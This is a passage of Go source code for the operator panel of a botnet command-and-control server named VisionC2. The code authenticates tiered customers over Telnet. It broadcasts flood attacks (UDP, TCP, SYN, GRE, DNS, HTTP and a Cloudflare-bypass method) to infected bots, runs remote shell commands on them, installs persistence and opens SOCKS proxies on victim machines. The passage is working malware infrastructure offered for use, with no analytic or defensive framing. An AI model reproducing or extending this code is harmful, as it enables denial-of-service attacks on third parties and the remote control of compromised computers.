	for {
		for _, cl := range clients {
			go func(c *client) {
				spinChars := []rune{'∴', '∵'} // Spinning animation characters
				spinIndex := 0

				for {
					attackCount := len(ongoingAttacks)

					// Format title with live stats
					title := fmt.Sprintf("    [%c]  Servers: %d | Attacks: %d/%d | ℣ | User: %s [%s] [%c]",
						spinChars[spinIndex], getBotCount(), attackCount, maxAttacks, c.user.Username, c.getLevelString(), spinChars[spinIndex])
					setTitle(c.conn, title)
					spinIndex = (spinIndex + 1) % len(spinChars)
					time.Sleep(1 * time.Second)
				}
			}(cl)
		}
		time.Sleep(time.Second * 2)
	}
}

// getBotCount returns the number of authenticated bots currently connected
// Thread-safe: uses RLock for concurrent read access
// Only counts bots that have completed authentication handshake
// Used in title updates and statistics displays
func getBotCount() int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	count := 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			count++
		}
	}
	return count
}

// getTotalRAM calculates total RAM across all authenticated bots (in MB)
// Thread-safe: uses RLock for concurrent read access
// Sums up RAM values reported by each bot during registration
// Used to display aggregate botnet capacity in banner/stats
func getTotalRAM() int64 {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	var totalRAM int64 = 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			totalRAM += botConn.ram
		}
	}
	return totalRAM
}

// formatRAM converts RAM from MB to human-readable string
// Automatically converts to GB for values >= 1024MB (1GB)
// Returns formatted string like "512MB" or "2.5GB"
// Makes large RAM values more readable in UI displays
func formatRAM(ramMB int64) string {
	if ramMB >= 1024 {
		return fmt.Sprintf("%.1fGB", float64(ramMB)/1024.0)
	}
	return fmt.Sprintf("%dMB", ramMB)
}

// ============================================================================
// USER INTERFACE FUNCTIONS
// Handle visual elements shown to authenticated admin users.
// Uses ANSI escape codes for colors and box-drawing characters.
// ============================================================================

// showBanner displays the VisionC2 ASCII art banner with live statistics
// Clears the terminal and draws the "All Seeing Eye" logo
// Integrates live stats: status, bot count, protocol version, encryption, total RAM
// Uses 256-color ANSI codes (38;5;xxx) for purple/gradient effects
// Called on login and when user types 'banner' command
func showBanner(conn net.Conn) {
	conn.Write([]byte("\033[2J\033[H")) // Clear screen and move cursor to home
	conn.Write([]byte("\r\n"))

	// All Seeing Eye ASCII Art with integrated status box
	conn.Write([]byte("\033[38;5;93m                              ░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;99m                        ░░▒▒▓▓████████████████████▓▓▒▒░░\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;105m                    ░▒▓███▓▒░░                  ░░▒▓███▓▒░\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;111m                 ░▓██▓░░  ╔═════════════════════════╗  ░░▓██▓░\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;117m               ▒██▓░     ║\033[38;5;196m  ☾ \033[38;5;231mV I S I O N \033[38;5;196m℣ \033[38;5;231mC 2  \033[38;5;117m  ║   ░▓██▒\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;123m             ▒██▒        ╠═════════════════════════╣        ▒██▒\033[0m\r\n"))
	conn.Write([]byte(fmt.Sprintf("\033[38;5;159m            ▓█▓          ║ \033[38;5;46m●\033[38;5;231m Status:  \033[38;5;46mONLINE\033[38;5;159m       ║         ▓█▓\033[0m\r\n")))
	conn.Write([]byte(fmt.Sprintf("\033[38;5;195m           ▓█▒           ║ \033[38;5;214m◈\033[38;5;231m Bots:    \033[38;5;46m%-4d\033[38;5;195m         ║          ▒█▓\033[0m\r\n", getBotCount())))
	conn.Write([]byte(fmt.Sprintf("\033[38;5;231m          ▒█▓            ║ \033[38;5;214m◈\033[38;5;231m Proto:   \033[38;5;214m%-11s\033[38;5;231m  ║         ▓█▒\033[0m\r\n", PROTOCOL_VERSION)))
	conn.Write([]byte("\033[38;5;195m           ▓█▒           ║ \033[38;5;214m◈\033[38;5;231m Encrypt: \033[38;5;46mTLS 1.3\033[38;5;195m      ║        ▒█▓\033[0m\r\n"))
	conn.Write([]byte(fmt.Sprintf("\033[38;5;159m            ▓█▓          ║ \033[38;5;214m◈\033[38;5;231m RAM:     \033[38;5;46m%-11s\033[38;5;159m  ║       ▓█▓\033[0m\r\n", formatRAM(getTotalRAM()))))
	conn.Write([]byte("\033[38;5;123m             ▒██▒        ╠═════════════════════════╣        ▒██▒\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;117m               ▒██▓░     ║\033[38;5;245m  help \033[38;5;240m• \033[38;5;245mattack \033[38;5;240m• \033[38;5;245mexit  \033[38;5;117m ║    ░▓██▒\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;111m                 ░▓██▓░░ ╚═════════════════════════╝  ░░▓██▓░\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;105m                    ░▒▓███▓▒░░                  ░░▒▓███▓▒░\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;99m                        ░░▒▒▓▓████████████████████▓▓▒▒░░\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;93m                              ░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░\033[0m\r\n"))
	conn.Write([]byte("\r\n"))

	conn.Write([]byte("\033[38;5;240m                   ══════════ ☠ Ready To Strike ☠ ══════════\033[0m\r\n"))
	conn.Write([]byte("\r\n"))
}

// authUser handles the login prompt and credential verification for admin users
// Allows up to 3 login attempts before disconnecting (brute force protection)
// Prompts for username and password with styled colored prompts
// Password field uses white-on-white text (hidden) for privacy
// On success, creates client struct and adds to active clients list
// Returns (true, client) on success, (false, nil) on failure
func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {

	for i := 0; i < 3; i++ { // 3 attempts max
		conn.Write([]byte("\033[2J\033[H")) // Clear screen
		conn.Write([]byte("\033[0m"))       // Reset colors

		conn.Write([]byte("\033[2J\033[H")) // Clear screen
		// Stylized eye
		conn.Write([]byte("\033[38;5;93m                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\033[0m\r\n"))
		conn.Write([]byte("\033[38;5;99m                      ▄█▀▀             ▀▀█▄\033[0m\r\n"))
		conn.Write([]byte("\033[38;5;105m                    ▄█▀   \033[38;5;196m▄▄▄▄▄▄▄▄▄\033[38;5;105m   ▀█▄\033[0m\r\n"))
		conn.Write([]byte("\033[38;5;111m                   █▀   \033[38;5;196m█▀\033[38;5;231m██████\033[38;5;196m▀█\033[38;5;111m   ▀█\033[0m\r\n"))
		conn.Write([]byte("\033[38;5;117m                  █▌   \033[38;5;196m█\033[38;5;231m████\033[38;5;196m◉\033[38;5;231m████\033[38;5;196m█\033[38;5;117m   ▐█\033[0m\r\n"))
		conn.Write([]byte("\033[38;5;111m                   █▄   \033[38;5;196m█▄\033[38;5;231m██████\033[38;5;196m▄█\033[38;5;111m   ▄█\033[0m\r\n"))
		conn.Write([]byte("\033[38;5;105m                    ▀█▄   \033[38;5;196m▀▀▀▀▀▀▀▀▀\033[38;5;105m   ▄█▀\033[0m\r\n"))
		conn.Write([]byte("\033[38;5;99m                      ▀█▄▄             ▄▄█▀\033[0m\r\n"))
		conn.Write([]byte("\033[38;5;93m                         ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[0m\r\n"))
		conn.Write([]byte("\r\n"))

		// Login box
		conn.Write([]byte("\033[38;5;240m           \033[38;5;245m     Unauthorized attemps are logged    \033[38;5;240m│\033[0m\r\n"))
		conn.Write([]byte("\r\n"))

		// Attempt counter
		if i > 0 {
			conn.Write([]byte(fmt.Sprintf("\033[38;5;196m                    ⚠ Login attempt %d of 3 - Access denied\033[0m\r\n\r\n", i)))
		}

		// Username prompt with blinking cursor effect
		conn.Write([]byte("\033[38;5;240m           ╭──────────────────────────────────────╮\033[0m\r\n"))
		conn.Write([]byte("\033[38;5;240m           │ \033[38;5;46m◈\033[38;5;231m Username \033[38;5;240m│\033[0m "))

		username, err := getFromConnReader(reader)
		if err != nil {
			return false, nil
		}

		conn.Write([]byte("\033[38;5;240m           │ \033[38;5;196m◈\033[38;5;231m Password \033[38;5;240m│\033[38;5;0m\033[48;5;0m "))

		password, err := getFromConnReader(reader)
		if err != nil {
			return false, nil
		}

		conn.Write([]byte("\033[0m"))
		conn.Write([]byte("\033[38;5;240m           ╰──────────────────────────────────────╯\033[0m\r\n"))

		// Authentication animation
		conn.Write([]byte("\r\n"))
		authFrames := []string{
			"           \033[38;5;226m[■□□□□□□□□□]\033[38;5;245m Verifying credentials...\033[0m",
			"           \033[38;5;226m[■■□□□□□□□□]\033[38;5;245m Checking database...\033[0m",
			"           \033[38;5;226m[■■■□□□□□□□]\033[38;5;245m Validating access level...\033[0m",
			"           \033[38;5;226m[■■■■□□□□□□]\033[38;5;245m Authenticating...\033[0m",
			"           \033[38;5;226m[■■■■■□□□□□]\033[38;5;245m Decrypting session...\033[0m",
			"           \033[38;5;226m[■■■■■■□□□□]\033[38;5;245m Establishing tunnel...\033[0m",
			"           \033[38;5;226m[■■■■■■■□□□]\033[38;5;245m Loading profile...\033[0m",
			"           \033[38;5;226m[■■■■■■■■□□]\033[38;5;245m Initializing session...\033[0m",
			"           \033[38;5;226m[■■■■■■■■■□]\033[38;5;245m Finalizing...\033[0m",
			"           \033[38;5;226m[■■■■■■■■■■]\033[38;5;245m Complete!\033[0m",
		}
		for _, frame := range authFrames {
			conn.Write([]byte(fmt.Sprintf("\r%s", frame)))
			time.Sleep(100 * time.Millisecond)
		}
		conn.Write([]byte("\r\n"))

		if exists, user := AuthUser(username, password); exists {
			// Success animation
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("\033[38;5;46m           ╔═══════════════════════════════════════════╗\033[0m\r\n"))
			conn.Write([]byte("\033[38;5;46m           ║   ✓ ACCESS GRANTED - WELCOME TO VISION   ║\033[0m\r\n"))
			conn.Write([]byte("\033[38;5;46m           ╚═══════════════════════════════════════════╝\033[0m\r\n"))
			time.Sleep(800 * time.Millisecond)

			conn.Write([]byte("\033[2J\033[H")) // Clear screen

			loggedClient := &client{
				conn: conn,
				user: *user,
			}
			clients = append(clients, loggedClient)
			return true, loggedClient
		}

		// Failed animation
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\033[38;5;196m           ╔═══════════════════════════════════════════╗\033[0m\r\n"))
		conn.Write([]byte("\033[38;5;196m           ║   ✗ ACCESS DENIED - INVALID CREDENTIALS  ║\033[0m\r\n"))
		conn.Write([]byte("\033[38;5;196m           ╚═══════════════════════════════════════════╝\033[0m\r\n"))
		time.Sleep(1500 * time.Millisecond)
	}

	// Final lockout message
	conn.Write([]byte("\033[2J\033[H"))
	conn.Write([]byte("\r\n\r\n\r\n"))
	conn.Write([]byte("\033[38;5;196m           ╔═══════════════════════════════════════════╗\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;196m           ║      ☠ ACCOUNT LOCKED - TOO MANY ATTEMPTS ☠     ║\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;196m           ║         Your IP has been logged.          ║\033[0m\r\n"))
	conn.Write([]byte("\033[38;5;196m           ╚═══════════════════════════════════════════╝\033[0m\r\n"))
	time.Sleep(2 * time.Second)

	conn.Close()
	return false, nil
}

// ============================================================================
// CONNECTION I/O UTILITIES
// Helper functions for reading user input from network connections.
// Handle line-based text protocols (Telnet-style) with newline trimming.
// ============================================================================

// getFromConn reads a single line from a network connection (creates new reader)
// Reads until newline delimiter (Telnet-style line input)
// Strips trailing \n and \r for clean string processing
// Creates a new bufio.Reader each call - use getFromConnReader for reuse
func getFromConn(conn net.Conn) (string, error) {
	readString, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		return readString, err
	}
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return readString, nil
}

// getFromConnReader reads a single line using existing bufio.Reader
// More efficient than getFromConn - reuses reader buffer across reads
// Used in user session loops where multiple inputs are expected
// Strips trailing newlines for clean command parsing
func getFromConnReader(reader *bufio.Reader) (string, error) {
	readString, err := reader.ReadString('\n')
	if err != nil {
		return readString, err
	}
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return readString, nil
}

// ============================================================================
// BOT COMMAND DISTRIBUTION
// Functions for sending commands to bots (broadcast or targeted).
// Handle command routing, error recovery, and response tracking.
// ============================================================================

// sendToBots broadcasts a command to ALL authenticated bots
// Thread-safe: uses RLock to allow concurrent command sends
// Failed sends trigger async bot removal (don't block other sends)
// Logs command with sent count vs total for verification
// Used by DDoS commands, shell commands, and bot management
func sendToBots(command string) {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	sentCount := 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			_, err := botConn.conn.Write([]byte(command + "\n"))
			if err != nil {
				fmt.Printf("[ERROR] Failed to send to bot %s: %v\n", botConn.botID, err)
				// Mark for cleanup in background (don't block other sends)
				go removeBotConnection(botConn.botID)
			} else {
				sentCount++
			}
		}
	}

	fmt.Printf("[COMMAND] Sent to %d/%d bots: %s\n", sentCount, len(botConnections), command)
}

// sendToBot sends a command to a specific bot by ID (full or partial match)
// Supports partial ID matching (first N characters) for convenience
// Tracks command origin in commandOrigin map so response routes back to user
// Returns true if command was sent successfully, false otherwise
// Used for !<botid> <command> syntax to target individual bots
func sendToBot(botID string, command string, userConn net.Conn, c *client) bool {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	for id, botConn := range botConnections {
		// Match full ID or partial prefix
		if id == botID || strings.HasPrefix(id, botID) {
			if botConn.authenticated {
				// Track which user sent this command for response routing
				originLock.Lock()
				commandOrigin[botConn.botID] = userConn
				originLock.Unlock()

				_, err := botConn.conn.Write([]byte(command + "\n"))
				if err != nil {
					fmt.Printf("[ERROR] Failed to send to bot %s: %v\n", botConn.botID, err)
					go removeBotConnection(botConn.botID)
					return false
				}
				fmt.Printf("[COMMAND] User %s (%s) sent to bot %s: %s\n",
					c.user.Username, c.getLevelString(), botConn.botID, command)
				return true
			}
		}
	}
	return false
}

// findBotByID looks up a bot connection by ID (supports partial matching)
// Returns the first bot whose ID matches or starts with the given string
// Thread-safe with RLock for concurrent access
// Returns nil if no matching bot found
// Used to validate bot existence before sending targeted commands
func findBotByID(botID string) *BotConnection {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	for id, botConn := range botConnections {
		// Match exact ID or prefix for partial ID targeting
		if id == botID || strings.HasPrefix(id, botID) {
			return botConn
		}
	}
	return nil
}

// ============================================================================
// USER SESSION HANDLER
// Main function handling admin CLI sessions from login to command processing.
// Implements the full user interface: login, banner, command loop, logout.
// ============================================================================

// handleRequest processes an incoming user connection for admin CLI access
// Performs Telnet negotiation for proper terminal handling
// Requires "spamtec" prefix as connection identifier/handshake
// Handles authentication, banner display, and main command loop
// Processes all user commands: attacks, shell, bot management, etc.
func handleRequest(conn net.Conn) {
	defer conn.Close() // Clean up on exit

	// Telnet negotiation for proper terminal handling
	// IAC WILL ECHO, IAC WILL SGA (suppress go ahead), IAC WONT LINEMODE
	conn.Write([]byte{255, 251, 1})  // IAC WILL ECHO
	conn.Write([]byte{255, 251, 3})  // IAC WILL SGA
	conn.Write([]byte{255, 252, 34}) // IAC WONT LINEMODE

	conn.Write([]byte(getConsoleTitleAnsi("☾℣☽")))

	// Use a single buffered reader for the entire connection
	reader := bufio.NewReader(conn)

	readString, err := reader.ReadString('\n')
	if err != nil {
		return
	}

	if strings.HasPrefix(readString, "spamtec") {
		if authed, c := authUser(conn, reader); authed {
			showBanner(conn)
			conn.Write([]byte(fmt.Sprintf("\033[0m\r  \033[38;5;15m\033[38;5;118m✅ Authentication Successful | Level: %s\n", c.getLevelString())))

			for {
				fmt.Fprintf(conn, "\n\r\033[38;5;146m[\033[38;5;161m%s\033[38;5;89m@\033[38;5;146m%s\033[38;5;146m]\033[38;5;82m► \033[0m", c.getLevelString(), c.user.Username)

				readString, err := reader.ReadString('\n')
				if err != nil {
					// Connection closed (EOF) or error - exit cleanly without logging
					return
				}
				readString = strings.TrimSuffix(readString, "\r\n")
				readString = strings.TrimSuffix(readString, "\n")

				parts := strings.Fields(readString)
				if len(parts) < 1 {
					continue
				}
				command := parts[0]
				switch strings.ToLower(command) {

				case "!udpflood", "!tcpflood", "!http", "!https", "!tls", "!cfbypass", "!syn", "!ack", "!gre", "!dns":
					if !c.canUseDDoS() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: DDoS commands require at least Basic level\r\n\033[0m"))
						continue
					}

					if len(parts) < 4 {
						conn.Write([]byte("Usage: method ip/url port duration [-p proxy_url.txt]\r\n"))
						continue
					}

					method := parts[0]
					ip := parts[1]
					port := parts[2]
					duration := parts[3]

					// Check for proxy mode: -p <proxy_url>
					proxyMode := false
					proxyURL := ""
					if len(parts) >= 6 && parts[4] == "-p" {
						// Proxy mode only for L7 methods
						if method == "!http" || method == "!https" || method == "!tls" || method == "!cfbypass" {
							proxyMode = true
							proxyURL = parts[5]
						} else {
							conn.Write([]byte("\033[1;33m⚠ Proxy mode (-p) only supported for L7 methods: !http, !https, !tls, !cfbypass\r\n\033[0m"))
						}
					}

					dur, err := time.ParseDuration(duration + "s")
					if err != nil {
						conn.Write([]byte("Invalid duration format.\r\n"))
						continue
					}
					conn.Write([]byte("\r\n"))
					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Target:\033[0m %s\r\n", ip)))
					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Port:\033[0m %s\r\n", port)))
					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Duration:\033[0m %ss\r\n", duration)))
					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Method:\033[0m %s\r\n", method)))
					if proxyMode {
						conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Proxy Mode:\033[0m Enabled (fetching from %s)\r\n", proxyURL)))
					}
					conn.Write([]byte("\r\n"))

					ongoingAttacks[conn] = attack{
						method:   method,
						ip:       ip,
						port:     port,
						duration: dur,
						start:    time.Now(),
					}

					go func(conn net.Conn, attack attack) {
						time.Sleep(attack.duration)
						delete(ongoingAttacks, conn)
						conn.Write([]byte("\033[38;5;46m✓ Attack completed and removed.\033[0m\n"))
					}(conn, ongoingAttacks[conn])

					// Build command string with optional proxy flag
					if proxyMode {
						sendToBots(fmt.Sprintf("%s %s %s %s -p %s", method, ip, port, duration, proxyURL))
					} else {
						sendToBots(fmt.Sprintf("%s %s %s %s", method, ip, port, duration))
					}

				case "!stop":
					if !c.canUseDDoS() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: DDoS commands require at least Basic level\r\n\033[0m"))
						continue
					}
					// Clear all ongoing attacks
					count := len(ongoingAttacks)
					for k := range ongoingAttacks {
						delete(ongoingAttacks, k)
					}
					// Send stop to all bots
					sendToBots("!stop")
					conn.Write([]byte(fmt.Sprintf("\033[38;5;46m✓ Stopped %d attack(s). Kill signal sent to all bots.\033[0m\r\n", count)))

				case "ongoing":
					if !c.canUseDDoS() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: DDoS commands require at least Basic level\r\n\033[0m"))
						continue
					}
					// Show ongoing attacks
					conn.Write([]byte("Ongoing Attacks:\r\n"))
					for _, attack := range ongoingAttacks {
						remaining := time.Until(attack.start.Add(attack.duration))
						if remaining > 0 {
							conn.Write([]byte(fmt.Sprintf("  %s -> %s:%s (%v remaining)\r\n",
								attack.method, attack.ip, attack.port, remaining.Round(time.Second))))
						}
					}

				case "!shell", "!exec":
					if !c.canUseShell() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Shell commands require at least Pro level\r\n\033[0m"))
						continue
					}
					if len(parts) < 2 {
						conn.Write([]byte("usage: !shell <command>\r\n"))
						continue
					}
					shellCmd := strings.Join(parts[1:], " ")
					sendToBots(fmt.Sprintf("!shell %s", shellCmd))
					conn.Write([]byte(fmt.Sprintf("Shell command sent to all bots: %s\r\n", shellCmd)))
					conn.Write([]byte("Waiting for bot responses...\r\n"))

				case "!detach", "!bg":
					if !c.canUseShell() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Shell commands require at least Pro level\r\n\033[0m"))
						continue
					}
					if len(parts) < 2 {
						conn.Write([]byte("usage: !detach <command>\r\n"))
						continue
					}
					shellCmd := strings.Join(parts[1:], " ")
					sendToBots(fmt.Sprintf("!detach %s", shellCmd))
					conn.Write([]byte(fmt.Sprintf("Detached command sent to all bots: %s\r\n", shellCmd)))

				case "banner":
					showBanner(conn)

				case "bots", "bot":
					conn.Write([]byte(fmt.Sprintf("\033[38;5;27m[\033[38;5;15mBots\033[38;5;73m: \033[38;5;15m%d \033[38;5;27m] \n\r", getBotCount())))
					// Show bot details
					botConnsLock.RLock()
					if len(botConnections) > 0 {
						conn.Write([]byte("\n\rConnected Bots:\r\n"))
						conn.Write([]byte("──────────────────────────────────────\r\n"))
						for _, botConn := range botConnections {
							uptime := time.Since(botConn.connectedAt).Round(time.Second)
							lastSeen := time.Since(botConn.lastPing).Round(time.Second)
							conn.Write([]byte(fmt.Sprintf("  ID: %s | IP: %s | Arch: %s | RAM: %s\n\r",
								botConn.botID, botConn.ip, botConn.arch, formatRAM(botConn.ram))))
							conn.Write([]byte(fmt.Sprintf("      Uptime: %v | Last: %v\n\r", uptime, lastSeen)))
						}
					}
					botConnsLock.RUnlock()

				case "cls", "clear":
					conn.Write([]byte("\033[2J\033[H"))
					showBanner(conn)

				case "logout", "exit":
					conn.Write([]byte("\033[38;5;27mLogging out...\n\r"))
					conn.Close()
					return

				case "!reinstall":
					if !c.canUseBotManagement() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Bot management commands require at least Admin level\r\n\033[0m"))
						continue
					}
					sendToBots("!reinstall")
					conn.Write([]byte("\033[1;33mReinstall command sent to all bots\r\n\033[0m"))

				case "!lolnogtfo":
					if !c.canUseBotManagement() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Bot management commands require at least Admin level\r\n\033[0m"))
						continue
					}
					sendToBots("!kill")
					conn.Write([]byte("\033[1;33mKill command sent to all bots\r\n\033[0m"))

				case "persist":
					if !c.canUseBotManagement() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Bot management commands require at least Admin level\r\n\033[0m"))
						continue
					}
					sendToBots("!persist")
					conn.Write([]byte("\033[1;33mPersistence command sent to all bots\r\n\033[0m"))

				case "help":
					c.showHelpMenu(conn)

				case "attack", "attacks", "methods":
					if !c.canUseDDoS() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Attack commands require at least Basic level\r\n\033[0m"))
						continue
					}
					c.showAttackMenu(conn)
				case "db":
					if !c.canUsePrivate() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Database access requires Owner level\r\n\033[0m"))
						continue
					}

					// Read the raw JSON file
					data, err := os.ReadFile("./users.json")
					if err != nil {
						conn.Write([]byte(fmt.Sprintf("Error reading credentials file: %v\r\n", err)))
						continue
					}

					conn.Write([]byte("\n\r\033[1;36m════════════════════ User Database ════════════════════\r\n\033[0m"))

					// Try to parse as structured JSON first
					var users []map[string]interface{}
					if err := json.Unmarshal(data, &users); err == nil {
						// Successfully parsed as JSON array
						for i, user := range users {
							username, _ := user["Username"].(string)
							password, _ := user["Password"].(string)
							level, _ := user["Level"].(string)
							expireStr, _ := user["Expire"].(string)

							// Parse expire time
							expireTime := time.Time{}
							if expireStr != "" {
								// Try multiple time formats
								formats := []string{
									"2006-01-02T15:04:05Z07:00",
									"2006-1-2T15:04:05Z07:00",
									"2006-01-02 15:04:05",
									time.RFC3339,
								}

								for _, format := range formats {
									if t, err := time.Parse(format, expireStr); err == nil {
										expireTime = t
										break
									}
								}
							}

							// Format expiration status
							expired := ""
							if !expireTime.IsZero() && expireTime.Before(time.Now()) {
								expired = " \033[1;31m[EXPIRED]\033[0m"
							} else if !expireTime.IsZero() {
								expired = fmt.Sprintf(" \033[1;32m[%s]\033[0m", time.Until(expireTime).Round(24*time.Hour))
							}

							// Format the output
							expireDisplay := "N/A"
							if !expireTime.IsZero() {
								expireDisplay = expireTime.Format("2006-01-02 15:04:05")
							}

							conn.Write([]byte(fmt.Sprintf("  \033[1;33m%d.\033[0m \033[1;37mUser:\033[0m %-15s \033[1;37mPass:\033[0m %-15s \033[1;37mLevel:\033[0m %-8s \033[1;37mExpires:\033[0m %s%s\r\n",
								i+1, username, password, level, expireDisplay, expired)))
						}
					} else {
						// If JSON parsing fails, show raw data
						conn.Write([]byte("\033[1;31mCould not parse JSON, showing raw data:\033[0m\r\n"))
						conn.Write([]byte(string(data)))
						conn.Write([]byte("\r\n"))
					}

					conn.Write([]byte("\033[1;36m═══════════════════════════════════════════════════\r\n\033[0m"))
				case "?":
					conn.Write([]byte("\033[1;33m'help' - commands  |  'attack' - attack methods\r\n\033[0m"))

				case "private":
					if !c.canUsePrivate() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Private commands require Owner level\r\n\033[0m"))
						continue
					}
					conn.Write([]byte("\033[1;35m=== Private Commands (Owner Only) ===\r\n"))
					conn.Write([]byte("db            - Show user database\r\n"))
					conn.Write([]byte("\033[0m"))

				case "!socks":
					if !c.canUseShell() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: SOCKS commands require at least Pro level\r\n\033[0m"))
						continue
					}
					if len(parts) < 2 {
						conn.Write([]byte("Usage: !socks <port>\r\n"))
						conn.Write([]byte("Example: !socks 1080\r\n"))
						continue
					}
					port := parts[1]
					sendToBots(fmt.Sprintf("!socks %s", port))
					conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 proxy started on port %s for all bots\r\n\033[0m", port)))

				case "!stopsocks":
					if !c.canUseShell() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: SOCKS commands require at least Pro level\r\n\033[0m"))
						continue
					}
					sendToBots("!stopsocks")
					conn.Write([]byte("\033[1;35mSOCKS5 proxy stop command sent to all bots\r\n\033[0m"))

				case "!info":
					if !c.canUseBotManagement() {
						conn.Write([]byte("\033[1;31m❌ Permission denied: Info command requires at least Admin level\r\n\033[0m"))
						continue
					}
					sendToBots("!info")
					conn.Write([]byte("Info request sent to all bots\r\n"))

				default:
					// Check if this is a bot-targeted command: !<botid> <command>
					if strings.HasPrefix(command, "!") && len(parts) >= 2 {
						botID := strings.TrimPrefix(parts[0], "!")
						// Check if this looks like a bot ID (not a known command)
						knownCommands := map[string]bool{
							"udpflood": true, "tcpflood": true, "http": true, "syn": true,
							"ack": true, "gre": true, "dns": true, "shell": true, "exec": true,
							"detach": true, "bg": true, "persist": true, "kill": true,
							"reinstall": true, "lolnogtfo": true, "socks": true, "stopsocks": true,
							"info": true, "stream": true,
						}

						if !knownCommands[botID] {
							// Check if user can target specific bots
							if !c.canTargetSpecificBot() {
								conn.Write([]byte("\033[1;31m❌ Permission denied: Targeting specific bots requires at least Pro level\r\n\033[0m"))
								continue
							}

							// This is a bot-targeted command
							targetCmd := strings.Join(parts[1:], " ")
							bot := findBotByID(botID)
							if bot != nil {
								if sendToBot(botID, targetCmd, conn, c) {
									conn.Write([]byte(fmt.Sprintf("\033[1;33mCommand sent to bot %s: %s\r\n\033[0m", bot.botID, targetCmd)))
									conn.Write([]byte("Waiting for response...\r\n"))
								} else {
									conn.Write([]byte(fmt.Sprintf("\033[1;31mFailed to send command to bot %s\r\n\033[0m", botID)))
								}
							} else {
								conn.Write([]byte(fmt.Sprintf("\033[1;31mBot not found: %s\r\n\033[0m", botID)))
								conn.Write([]byte("Use 'bots' command to see connected bots\r\n"))
							}
							continue
						}
					}
					fmt.Printf("Received input: '%s'\n", readString)
					conn.Write([]byte("Invalid command. Type 'help' for available commands.\n\r"))
				}
			}
		}
	}
}
